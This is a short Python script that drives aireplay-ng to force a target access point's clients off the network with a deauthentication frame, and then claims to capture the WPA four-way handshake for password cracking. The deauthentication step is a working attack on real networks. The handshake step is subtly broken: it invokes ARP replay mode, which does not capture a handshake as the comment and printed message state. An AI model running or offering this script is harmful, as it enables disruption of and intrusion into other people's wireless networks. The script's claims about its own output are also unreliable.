import os
import subprocess

adapter_name = os.environ.get('WIRELESS_ADAPTER_NAME')
network_capture_file = 'network_capture-01.csv'

def deauthorization(target_mac, adapter_name=None):
    if adapter_name is None:
        adapter_name = os.environ.get('WIRELESS_ADAPTER_NAME')
        if not adapter_name:
            print("Error: Wireless adapter name not found.")
            return

    try:
        # Deauthenticate
        subprocess.run(['aireplay-ng', '-0', '1', '-a', target_mac, adapter_name], check=True)
        print(f"Deauthenticated {target_mac}...")

        # Capture handshake
        subprocess.run(['aireplay-ng', '-3', '-b', target_mac, '-w', 'handshake.cap', adapter_name], check=True)
        print(f"Captured four-way handshake from {target_mac}...")

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
